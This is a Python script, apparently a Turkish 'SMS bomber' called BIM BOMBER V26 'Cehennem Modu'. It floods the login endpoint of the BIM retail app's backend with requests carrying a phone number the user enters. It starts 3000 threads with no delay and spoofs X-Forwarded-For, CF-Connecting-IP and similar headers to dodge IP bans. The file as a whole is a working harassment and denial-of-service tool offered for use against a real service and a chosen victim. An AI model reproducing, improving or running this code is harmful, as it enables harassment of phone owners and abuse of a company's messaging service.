# -*- coding: utf-8 -*-
import requests
import threading
import random
import os
import time
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class MockColor:
        def __getattr__(self, name): return ""
    Fore = Style = MockColor()

# ═══════════════════════════════════════════════════════════════════
#   BIM BOMBER V26 — CEHENNEM MODU (MAX AGGRESSIVE)
#   Hedef: Saniyede 1000+ Istek
#   Strateji: IP Spoofing, 0 Saniye Bekleme, Korumaları Aşma
# ═══════════════════════════════════════════════════════════════════

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
]

# ─── Global sayaclar (thread-safe) ───
_gonderilen = 0
_basarili   = 0
_basarisiz  = 0
_baslangic  = 0.0
_dur        = False

def _inc(ok: bool):
    global _gonderilen, _basarili, _basarisiz
    _gonderilen += 1
    if ok: _basarili  += 1
    else:  _basarisiz += 1

def hiz():
    gecen = time.time() - _baslangic
    return _gonderilen / gecen if gecen > 0.001 else 0.0

def rnd_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def make_headers():
    ip = rnd_ip()
    return {
        "User-Agent": random.choice(UA_LIST),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "Referer": "https://www.bim.com.tr/",
        "Origin": "https://www.bim.com.tr",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Client-IP": ip,
        "True-Client-IP": ip,
        "CF-Connecting-IP": ip,
    }

# ─── Worker: Hiç durmadan saldır ───
def _cehennem_worker(phone):
    global _dur
    # Session kullanmak hızı artırır, her worker 1 session tutar
    s = requests.Session()
    s.headers.update(make_headers())
    url = "https://bim.veesk.net/service/v1.0/account/login"
    payload = {"phone": phone}
    
    while not _dur:
        try:
            # IP Ban yememek için her 50 istekte bir IP'yi sahtele (değiştir)
            if random.random() < 0.02:
                s.headers.update(make_headers())
                
            r = s.post(url, json=payload, timeout=5)
            ok = (r.status_code == 200)
            _inc(ok)
            # SLEEP YOK! Yüzde yüz CPU ve ağ gücü kullanılacak.
        except:
            _inc(False)

# ─── Saniye bas rapor (Artık terminali dondurmamak için logları kıstık) ───
def _rapor_thread():
    while not _dur:
        time.sleep(0.5)
        if _baslangic > 0:
            gecen = time.time() - _baslangic
            print(f"  {Fore.LIGHTRED_EX}>>> {gecen:.1f}sn | HIZ: {hiz():.0f} Istek/Saniye | BASARILI: {_basarili} | BASARISIZ: {_basarisiz} <<<{Style.RESET_ALL}", end='\r')

# ═══════════════ MOD ═══════════════

def cehennem_modu(phone, worker_sayisi=3000):
    global _baslangic, _gonderilen, _basarili, _basarisiz, _dur
    _gonderilen = _basarili = _basarisiz = 0
    _baslangic  = time.time()
    _dur        = False

    print(f"\n  {Fore.LIGHTMAGENTA_EX}>>> CEHENNEM MODU AKTIF EDILECEK! <<<")
    print(f"  {Fore.LIGHTRED_EX}UYARI: INTERNETINIZ YAVASLAYABILIR, CPU %100 OLABILIR!")
    print(f"  {Fore.LIGHTRED_EX}WORKER SAYISI: {worker_sayisi} (Limiti zorluyoruz)")
    print(f"  {Fore.LIGHTCYAN_EX}IP Spoofing (Sahte IP) Aktif! Korumalar atlatilmaya calisiliyor.\n")

    # Rapor thread
    rt = threading.Thread(target=_rapor_thread, daemon=True)
    rt.start()

    # Tumunu baslat
    threads = []
    try:
        for i in range(worker_sayisi):
            t = threading.Thread(target=_cehennem_worker, args=(phone,), daemon=True)
            t.start()
            threads.append(t)
            if i % 500 == 0 and i > 0:
                print(f"  {Fore.LIGHTYELLOW_EX}[*] {i} worker baslatildi...{Style.RESET_ALL}")
            
        print(f"\n  {Fore.LIGHTGREEN_EX}[*] TUM WORKERLAR ATESLIYOR! DURDURMAK ICIN CTRL+C YAPIN.\n")

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        _dur = True
        gecen = time.time() - _baslangic
        print(f"\n\n  {Fore.LIGHTYELLOW_EX}[SALDIRI DURDURULDU]")
        print(f"  Sure       : {gecen:.1f}s")
        print(f"  Toplam     : {_gonderilen}")
        print(f"  Basarili   : {_basarili}")
        print(f"  Ort Hiz    : {hiz():.1f} Istek/saniye")
        time.sleep(2)


# ═══════════════ UI ═══════════════

def logo():
    os.system("cls||clear")
    print(f"""{Fore.LIGHTRED_EX}
 ██████╗███████╗██╗  ██╗███████╗███╗   ██╗██████╗  ██████╗ ██████╗ ███╗   ███╗
██╔════╝██╔════╝██║  ██║██╔════╝████╗  ██║██╔══██╗██╔═══██╗██╔══██╗████╗ ████║
██║     █████╗  ███████║█████╗  ██╔██╗ ██║██║  ██║██║   ██║██████╔╝██╔████╔██║
██║     ██╔══╝  ██╔══██║██╔══╝  ██║╚██╗██║██║  ██║██║   ██║██╔══██╗██║╚██╔╝██║
╚██████╗███████╗██║  ██║███████╗██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║
 ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
    {Fore.LIGHTWHITE_EX}Servis   : {Fore.LIGHTGREEN_EX}BIM — bim.veesk.net
    {Fore.LIGHTWHITE_EX}Strateji : {Fore.LIGHTRED_EX}0 Saniye Bekleme | IP Spoofing | 3000 Klon | NO LIMIT
    {Fore.LIGHTWHITE_EX}Surum    : {Fore.LIGHTYELLOW_EX}V26 CEHENNEM (1000+/s Hedef)
    """)

def main():
    while True:
        logo()
        print(f"  {Fore.LIGHTMAGENTA_EX}[1] Cehennem Modu (Sinirsiz Guc, IP Spoof, 0 Bekleme)")
        print(f"  {Fore.LIGHTWHITE_EX}[2] Cikis\n")

        secim = input(f"  {Fore.LIGHTCYAN_EX}Seciminiz: ").strip()

        if secim == "2":
            break
        if secim != "1":
            continue

        tel = input(f"  {Fore.LIGHTYELLOW_EX}Telefon (+90 olmadan, 10 hane): ").strip()
        if len(tel) != 10 or not tel.isdigit():
            print(f"  {Fore.LIGHTRED_EX}Hatali numara! Ornek: 5321234567")
            time.sleep(2); continue

        # Direkt cehennem
        cehennem_modu(tel, worker_sayisi=3000)
        
        input(f"\n  {Fore.LIGHTCYAN_EX}Enter = menu...")

if __name__ == "__main__":
    main()
